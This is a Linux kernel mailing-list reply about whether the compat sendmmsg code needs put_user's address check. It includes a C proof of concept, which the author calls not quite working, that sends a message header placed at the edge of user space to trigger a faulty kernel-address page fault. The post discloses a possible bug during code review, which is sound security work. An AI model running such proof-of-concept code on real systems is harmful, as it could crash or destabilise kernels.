From: Andy Lutomirski <luto@MIT.EDU>
Subject: Re: sendmmsg: put_user vs __put_user
Date: Thu, 05 Apr 2012 17:14:25 -0700
Message-ID: <4F7E3561.8000803@mit.edu>
References: <CAOPLpQf2bmj+i_zYtsS8JNzTDuBxCO5ByNRRqwv0kxaDBFdezg@mail.gmail.com> <20120330.205120.2221145622131588797.davem@davemloft.net>
Mime-Version: 1.0
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit
Cc: drepper@gmail.com, netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
To: David Miller <davem@davemloft.net>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <20120330.205120.2221145622131588797.davem@davemloft.net>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

On 03/30/2012 05:51 PM, David Miller wrote:
> From: Ulrich Drepper <drepper@gmail.com>
> Date: Fri, 30 Mar 2012 09:36:11 -0400
> 
>> Shouldn't the compat code in the sendmmsg implementation use the same
>> code as the normal code?  In which case you probably want something
>> like this:
> 
> Compat processes are not able to generate virtual addresses anywhere
> near the range where the kernel resides, so the address range
> verification done by put_user() is completely superfluous and
> therefore not necessary.  The normal exception handling done by the
> access is completely sufficient.

I disagree.  The following exploit causes a bogus page fault to a kernel
address.  I think this isn't exploitable right now on x86-64 because the
page fault handler fixes it up, but I wouldn't be surprised if this
crashes or at least warns on some architecture.  (Actually trashing
kernel memory is probably impossible with this on x86-64 chips because
this can only overrun user space by four bytes, and there's a giant gap
of impossible addresses above user space in x86-64.

Compile as 64 bit code.  Tested by instrumenting the page fault handler.

/* Not quite working exploit.  Copyright (c) 2012 Andy Lutomirski. */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdio.h>

#define COMPAT_MSGHDR_SIZE 28
#define TASK_SIZE_MAX	((1UL << 47) - 4096)
#define MSG_CMSG_COMPAT 0x80000000

int main()
{
	int s;
	struct sockaddr_in addr;
	struct msghdr *hdr;

	char *highpage = mmap((void*)(TASK_SIZE_MAX - 4096), 4096,
	                      PROT_READ | PROT_WRITE,
	                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
	                      -1, 0);
	if (highpage == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == -1) {
		perror("socket");
		return 1;
	}

        addr.sin_family = AF_INET;
        addr.sin_port = htons(1);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
		perror("connect");
		return 1;
	}

	void *evil = highpage + 4096 - COMPAT_MSGHDR_SIZE;
	printf("Evil address is %p\n", evil);

	// Purely for illustration.
	if (sendmsg(s, evil, MSG_CMSG_COMPAT) < 0) {
		perror("sendmsg");
		return 1;
	}
	memset(highpage, 0, 4096);
	{
		int tmp;
		socklen_t sz;
		getsockopt(s, SOL_SOCKET, SO_ERROR, &tmp, &sz);
	}

	if (syscall(__NR_sendmmsg, s, evil, 1, MSG_CMSG_COMPAT) < 0) {
		perror("sendmmsg");
		return 1;
	}

	return 0;
}
